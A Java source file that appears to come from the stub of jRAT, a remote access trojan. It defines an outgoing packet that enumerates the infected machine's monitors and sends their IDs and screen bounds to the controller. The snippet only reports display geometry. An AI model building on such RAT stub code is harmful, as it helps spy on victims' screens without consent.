package se.jrat.stub.packets.outgoing;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet18InitMonitors extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		GraphicsDevice[] monitors = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
		
		dos.writeInt(monitors.length);

		for (GraphicsDevice device : monitors) {
			Rectangle bounds = device.getDefaultConfiguration().getBounds();
			String id = device.getIDstring();
			if (id.startsWith("\\")) {
				id = id.substring(1, id.length());
			}
			
			sw.writeLine(device.getIDstring());
			dos.writeInt(bounds.x);
			dos.writeInt(bounds.y);
			dos.writeInt(bounds.width);
			dos.writeInt(bounds.height);
		}
	}

	@Override
	public byte getPacketId() {
		return (byte) 18;
	}

}
